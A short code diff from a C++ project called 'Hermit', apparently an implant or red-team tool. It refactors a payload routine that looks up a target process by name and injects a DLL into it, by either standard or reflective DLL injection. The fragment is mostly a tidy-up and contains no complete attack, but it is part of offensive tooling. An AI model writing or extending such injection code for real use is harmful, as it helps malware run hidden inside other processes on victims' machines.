@@ -85,18 +85,26 @@ namespace Hermit
             return;
         }
 
-        // Target PID
-        DWORD dwPID;
+        // Target PID to be injected DLL.
+        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
 
         // Inject DLL
         if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
         {
-            dwPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
-            Technique::Injection::DLLInjection(pState->pProcs, dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
+            Technique::Injection::DLLInjection(
+                pState->pProcs,
+                dwTargetPID,
+                (LPVOID)dllPath.c_str(),
+                dwDllPathSize
+            );
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
         {
-            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dllPath.c_str(), dwDllPathSize);
+            Technique::Injection::ReflectiveDLLInjection(
+                pState->pProcs,
+                dwTargetPID,
+                dllPath.c_str()
+            );
         }
 
         State::Free(pState);
